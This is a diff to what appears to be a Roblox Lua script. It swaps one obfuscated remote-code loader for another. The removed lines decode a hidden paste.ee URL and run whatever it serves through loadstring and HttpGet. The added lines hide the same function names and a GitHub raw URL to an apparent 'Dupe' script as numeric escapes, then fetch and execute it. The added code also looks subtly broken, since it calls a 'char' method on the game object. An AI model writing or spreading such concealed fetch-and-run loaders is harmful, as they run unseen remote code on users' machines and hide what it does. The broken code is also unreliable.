@@ -1,16 +1,5 @@
-local Jxv = getfenv and getfenv() or _ENV
-local Rwp = Jxv["loadstring"]
-local Mzt = Jxv["game"]["HttpGet"]
-local Fcl = Jxv["game"]
-
-local function Bqr(Ysl)
-    local Vnk = {}
-    for Pjh = 1, #Ysl do
-        Vnk[#Vnk + 1] = "\\" .. string.byte(Ysl:sub(Pjh, Pjh))
-    end
-    return Rwp(Fcl:HttpGet(Rwp("return \"" .. table.concat(Vnk) .. "\"")()))
-end
-
-local obfURL = "\104\116\116\112\115\58\47\47\112\97\115\116\101\46\101\101\47\114\47\103\57\102\69\110\56\69\108"
-
-Bqr(obfURL)()
+return(function()
+    local a = {"\108\111\097\100\115\116\114\105\110\103","\103\097\109\101","\072\116\116\112\071\101\116"}
+    local b = "\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\107\105\101\108\056\047\068\117\112\101\047\114\101\102\115\047\104\101\097\100\115\047\109\097\105\110\047\083\099\114\105\112\116"
+    return _G[a[1]](_G[a[2]][a[3]](_G[a[2]]:char(table.unpack({string.byte(b,1,#b)}))))
+end)()
